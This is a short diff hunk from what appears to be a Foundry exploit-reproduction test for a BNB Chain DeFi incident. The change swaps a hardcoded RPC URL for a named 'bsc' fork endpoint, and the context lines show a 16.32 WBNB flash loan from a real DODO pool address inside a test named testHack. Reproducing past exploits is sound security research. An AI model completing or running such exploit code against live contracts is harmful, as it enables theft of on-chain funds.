@@ -20,7 +20,7 @@ contract Exploit is Test {
     IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
 
     function testHack() external {
-        vm.createSelectFork("https://1rpc.io/bnb", 25_430_418);
+        vm.createSelectFork("bsc", 25_430_418);
 
         // flashloan 16.32 WBNB
         DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
